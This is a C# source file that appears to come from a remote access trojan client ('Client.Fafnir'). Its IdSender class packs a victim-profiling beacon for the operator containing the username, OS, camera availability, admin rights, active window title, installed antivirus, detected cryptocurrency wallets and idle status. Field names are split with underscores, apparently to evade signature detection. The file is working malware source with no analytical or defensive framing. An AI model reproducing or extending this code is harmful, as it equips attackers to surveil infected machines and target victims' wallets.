using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Microsoft.VisualBasic.Devices;

namespace Client.Fafnir;

public static class IdSender
{
	public static byte[] SendInfo()
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "ClientInfo";
		msgPack.ForcePathObject("HWID").AsString = Settings.Hw_id;
		msgPack.ForcePathObject("User").AsString = Environment.UserName.ToString();
		msgPack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
		msgPack.ForcePathObject("Camera").AsString = Camera.havecamera().ToString();
		msgPack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
		msgPack.ForcePathObject("Version").AsString = Settings.Ver_sion;
		msgPack.ForcePathObject("Admin").AsString = Methods.IsAdmin().ToString().ToLower()
			.Replace("true", "Admin")
			.Replace("false", "User");
		msgPack.ForcePathObject("Perfor_mance").AsString = Methods.GetActiveWindowTitle();
		msgPack.ForcePathObject("Paste_bin").AsString = Settings.Paste_bin;
		msgPack.ForcePathObject("Anti_virus").AsString = Methods.Antivirus();
		msgPack.ForcePathObject("Install_ed").AsString = new FileInfo(Application.ExecutablePath).LastWriteTime.ToUniversalTime().ToString();
		msgPack.ForcePathObject("Po_ng").AsString = "";
		msgPack.ForcePathObject("Group").AsString = Settings.Group;
		msgPack.ForcePathObject("Wallets").AsString = Methods.GetWallets();
		msgPack.ForcePathObject("IsOnline").AsString = Methods.CheckIdle().Result;
		Console.WriteLine("Captured Status:" + Methods.CheckIdle().Result);
		return msgPack.Encode2Bytes();
	}
}
